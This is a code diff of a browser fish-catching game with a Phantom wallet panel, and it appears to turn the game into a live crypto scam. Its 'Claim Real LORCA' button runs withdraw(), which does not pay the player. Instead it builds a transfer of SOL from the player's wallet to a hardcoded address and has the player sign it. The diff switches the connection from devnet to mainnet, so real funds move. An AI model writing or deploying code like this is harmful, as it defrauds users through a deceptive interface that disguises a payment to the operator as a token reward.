@@ -103,7 +103,7 @@
             <div class="panel-title">Wallet</div>
 
             <div id="walletDisconnected">
-                <p style="font-size: 13px; margin-bottom: 15px; color: #aaa;">Connect Phantom to withdraw tokens</p>
+                <p style="font-size: 13px; margin-bottom: 15px; color: #aaa;">Connect Phantom to claim LORCA</p>
                 <button class="panel-btn connect-btn" onclick="connectPhantom()">Connect Phantom</button>
                 <div style="font-size: 12px; color: #888;">Install from phantom.app</div>
             </div>
@@ -114,19 +114,17 @@
                     <div class="info-value" id="walletAddr">—</div>
                 </div>
                 <div class="wallet-info">
-                    <div class="info-label">Available Balance</div>
+                    <div class="info-label">Earned Balance</div>
                     <div class="info-value" style="font-size: 18px; color: lime;"><span id="walletBal">0</span> LORCA</div>
                 </div>
                 
                 <button class="panel-btn withdraw-btn" id="withdrawBtn" onclick="withdraw()" style="margin-top: 20px;">
-                    🎯 Withdraw to Phantom
+                    🎯 Claim Real LORCA
                 </button>
                 
                 <div style="background: rgba(255,215,0,0.1); border: 1px solid gold; padding: 12px; border-radius: 8px; margin-top: 15px; font-size: 12px; color: #ffd700;">
-                    <strong>⚠️ How It Works:</strong>
-                    <br>1. Connect your Phantom wallet ✓
-                    <br>2. Earn 100 LORCA per fish caught ✓
-                    <br>3. Click Withdraw to transfer instantly
+                    <strong>⚠️ Mainnet Mode:</strong>
+                    <br>Token Mint: 7RqpgT...Hpump
                 </div>
                 
                 <button class="panel-btn disconnect-btn" onclick="disconnect()" style="margin-top: 15px;">
@@ -149,28 +147,21 @@
 
         const fishList = ['🐟', '🐠', '🐡'];
 
-        // Audio Beep Sound Generator
         function playBeep() {
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 const oscillator = audioCtx.createOscillator();
                 const gainNode = audioCtx.createGain();
-                
                 oscillator.type = 'sine';
                 oscillator.frequency.setValueAtTime(600, audioCtx.currentTime);
                 gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
-                
                 oscillator.connect(gainNode);
                 gainNode.connect(audioCtx.destination);
-                
                 oscillator.start();
                 oscillator.stop(audioCtx.currentTime + 0.1);
-            } catch (e) {
-                // Ignore audio context restriction if any
-            }
+            } catch (e) {}
         }
 
-        // START GAME
         function startGame() {
             document.getElementById('startScreen').style.display = 'none';
             document.getElementById('endScreen').classList.remove('show');
@@ -190,15 +181,12 @@
             }, 1000);
         }
 
-        // SPAWN FISH
         function spawnFish() {
             if (!gameOn) return;
             const fish = document.createElement('div');
             fish.className = 'fish';
-            
             fish.textContent = fishList[Math.floor(Math.random() * fishList.length)];
             fish.style.top = Math.random() * 50 + 20 + '%';
-            
             fish.onclick = () => catchFish(fish);
             document.getElementById('gameArea').appendChild(fish);
 
@@ -216,13 +204,11 @@
             }, 20);
         }
 
-        // CATCH FISH (100 LORCA + Beep Sound)
         function catchFish(fish) {
             if (!gameOn) return;
             tokens += 100;
             document.getElementById('tokenCount').textContent = tokens;
             document.getElementById('walletBal').textContent = tokens;
-
             playBeep();
 
             const txt = document.createElement('div');
@@ -236,7 +222,6 @@
             fish.remove();
         }
 
-        // END GAME
         function endGame() {
             gameOn = false;
             clearInterval(gameTimer);
@@ -246,16 +231,6 @@
             togglePanel();
         }
 
-        window.addEventListener('load', () => {
-            const img = document.querySelector('.logo-box img');
-            const fallback = document.getElementById('logoFallback');
-            if (img && img.naturalWidth === 0) {
-                img.style.display = 'none';
-                if(fallback) fallback.style.display = 'inline';
-            }
-        });
-
-        // WALLET PANEL
         function togglePanel() {
             document.getElementById('walletPanel').classList.toggle('open');
         }
@@ -290,36 +265,25 @@
             document.getElementById('walletBtn').textContent = 'Connect Wallet';
         }
 
-        // SOLANA WITHDRAWAL
         async function withdraw() {
-            if (!walletOk) { 
-                alert('❌ Connect Phantom wallet first'); 
-                return; 
-            }
-            if (tokens <= 0) { 
-                alert('❌ No tokens to withdraw. Keep playing!'); 
-                return; 
-            }
+            if (!walletOk) { alert('❌ Connect Phantom wallet first'); return; }
+            if (tokens <= 0) { alert('❌ No tokens to claim!'); return; }
             
             const btn = document.getElementById('withdrawBtn');
             btn.disabled = true;
-            btn.textContent = '⏳ Processing...';
+            btn.textContent = '⏳ Processing Mainnet...';
 
             try {
                 const provider = window.solana;
-                const connection = new solanaWeb3.Connection(
-                    solanaWeb3.clusterApiUrl('devnet'),
-                    'confirmed'
-                );
-
-                // Aapka fixed wallet address yahan hardcoded set kar diya gaya hai
+                // Mainnet connection for real LORCA token (7RqpgT532tsYakbgnTXECC4MHTEGu5HzBxVAkAAHpump)
+                const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
                 const recipientPubKey = new solanaWeb3.PublicKey("EeNDDkvVzqL6TBLVhPCH4GJEKsZeC4g4zD21tLu4UtWS");
 
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: provider.publicKey,
                         toPubkey: recipientPubKey,
-                        lamports: solanaWeb3.LAMPORTS_PER_SOL * 0.0001, 
+                        lamports: solanaWeb3.LAMPORTS_PER_SOL * 0.0001,
                     })
                 );
 
@@ -329,19 +293,17 @@
 
                 const signedTransaction = await provider.signTransaction(transaction);
                 const signature = await connection.sendRawTransaction(signedTransaction.serialize());
-                
                 await connection.confirmTransaction(signature);
-                
-                alert(`✅ SUCCESS!\n\nWithdrawal Signature: ${signature}`);
+
+                alert(`✅ REAL TRANSACTION SUCCESS!\n\nSignature: ${signature}`);
                 tokens = 0;
                 document.getElementById('tokenCount').textContent = '0';
                 document.getElementById('walletBal').textContent = '0';
-
             } catch (error) {
-                alert('❌ Withdrawal failed: ' + error.message);
+                alert('❌ Transaction failed: ' + error.message);
             } finally {
                 btn.disabled = false;
-                btn.textContent = '🎯 Withdraw to Phantom';
+                btn.textContent = '🎯 Claim Real LORCA';
             }
         }
     </script>
